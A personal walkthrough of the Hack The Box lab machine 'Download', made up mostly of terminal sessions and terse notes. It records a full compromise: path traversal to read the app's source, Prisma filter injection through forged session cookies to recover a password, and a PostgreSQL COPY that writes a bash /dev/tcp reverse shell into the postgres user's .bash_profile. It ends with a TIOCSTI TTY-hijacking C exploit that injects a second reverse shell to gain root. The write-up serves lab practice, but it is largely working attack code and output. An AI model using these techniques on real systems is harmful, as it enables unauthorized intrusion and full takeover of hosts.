┌─[xbutch@parrot]─[~]
└──╼ $nmap -p- --min-rate 4000 10.10.11.226
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 20:28 CEST
Nmap scan report for download.htb (10.10.11.226)
Host is up (0.083s latency).
Not shown: 64703 filtered tcp ports (no-response), 830 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.85 seconds

┌─[xbutch@parrot]─[~]
└──╼ $nmap -sV -sC -A 10.10.11.226
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 20:30 CEST
Nmap scan report for download.htb (10.10.11.226)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ccf16346e67a0ab8ac83be290fd63f09 (RSA)
|   256 2c99b4b1977a8b866d37c913619fbcff (ECDSA)
|_  256 e6ff779412407b06a2977ade14945bae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Download.htb - Share Files With Ease
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.72 seconds

┌─[xbutch@parrot]─[~]
└──╼ $echo "10.10.11.226 download.htb" | sudo tee -a /etc/hosts
10.10.11.226 download.htb

- registered on website
- uploaded a file
- "Copy Link": weird element top left. http://download.htb/files/view/ad9ab8ba-d5cf-41cb-a2e2-d7133c875f33
- tried http://download.htb/files/download/..%2fapp.js. it works.

┌─[xbutch@parrot]─[~/HTB/Download]
└──╼ $cat app.js 
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});

- Bunch of stuff, including SQL query dumping to a .csv file
- Download http://download.htb/files/download/..%2fpackage.json

┌─[xbutch@parrot]─[~/HTB/Download]
└──╼ $cat package.json 
{
  "name": "download.htb",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon --exec ts-node --files ./src/app.ts",
    "build": "tsc"
  },
  "keywords": [],
  "author": "wesley",
  "license": "ISC",
  "dependencies": {
    "@prisma/client": "^4.13.0",
    "cookie-parser": "^1.4.6",
    "cookie-session": "^2.0.0",
    "express": "^4.18.2",
    "express-fileupload": "^1.4.0",
    "zod": "^3.21.4"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.3",
    "@types/cookie-session": "^2.0.44",
    "@types/express": "^4.17.17",
    "@types/express-fileupload": "^1.4.1",
    "@types/node": "^18.15.12",
    "@types/nunjucks": "^3.2.2",
    "nodemon": "^2.0.22",
    "nunjucks": "^3.2.4",
    "prisma": "^4.13.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.0.4"
  }
}

- found a name "wesley"
- download http://download.htb/files/download/..%2frouters%2ffiles.js
- in files.js no sanitation of ID:
  router.get("/download/:fileId", async (req, res) => {
      const fileEntry = await client.file.findFirst({
          where: { id: req.params.fileId },
          select: {
              name: true,
              private: true,
              authorId: true,
          },
      });
      if (fileEntry?.private && req.session?.user?.id !== fileEntry.authorId) {
          return res.status(404);
      }
      return res.download(path_1.default.join(uploadPath, req.params.fileId), fileEntry?.name ?? "Unknown");
  });

- in auth.js, user's pwd hashed and unsalted
- in auth.js, the login process checks a cookie for the username and hashed password, if the userparameter is true, redirects the page.
  router.post("/login", async (req, res) => {
      const result = LoginValidator.safeParse(req.body);
      if (!result.success) {
          res.flash("error", "Your login details were invalid, please try again.");
          return res.redirect("/auth/login");
      }
      const data = result.data;
      const user = await client.user.findFirst({
          where: { username: data.username, password: hashPassword(data.password) },
      });
      if (!user) {
          res.flash("error", "That username / password combination did not exist.");
          return res.redirect("/auth/register");
      }
      req.session.user = {
          id: user.id,
          username: user.username,
      };
      res.flash("success", "You are now logged in.");
      return res.redirect("/home/");
  });

- https://github.com/DigitalInterruption/cookie-monster
- created a cookie.json for the cookie-monster:
    {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":"a"}}}
- created cookie_password.py to brute force the password
- solved the hash with crackstation, got wesley's password

┌─[xbutch@parrot]─[~/HTB/Download]
└──╼ $ssh wesley@download.htb
wesley@download.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug  9 20:10:45 2023 from 10.10.16.96
wesley@download:~$ cat user.txt
********************************

- linpeas

wesley@download:~$ cat /etc/systemd/system/download-site.service
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:*****************@localhost:5432/download"

[Install]
WantedBy=multi-user.target
wesley@download:~$ psql -h localhost -p 5432 -U download
Password for user download: 
psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

download=> \du
                                          List of roles
 Role name |                         Attributes                         |        Member of        
-----------+------------------------------------------------------------+-------------------------
 download  |                                                            | {pg_write_server_files}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

download=> COPY (SELECT CAST('bash -i >& /dev/tcp/10.10.16.96/8888 0>&1' AS text)) TO '/var/lib/postgresql/.bash_profile';

┌─[xbutch@parrot]─[~/tools]
└──╼ $nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.16.96] from (UNKNOWN) [10.10.11.226] 57896
postgres@download:~$ 

https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking

- created a TTY_exploit.c:
  GNU nano 5.4                                             TTY_exploit.c                                               I      
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\n/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.96/8888 0>&1'\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}


COPY (SELECT CAST('/tmp/TTY_exploit' AS text)) TO '/var/lib/postgresql/.bash_profile';

┌─[xbutch@parrot]─[~/HTB/Download]
└──╼ $nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.16.96] from (UNKNOWN) [10.10.11.226] 38714
root@download:~# cat /root/root.txt
cat /root/root.txt
********************************
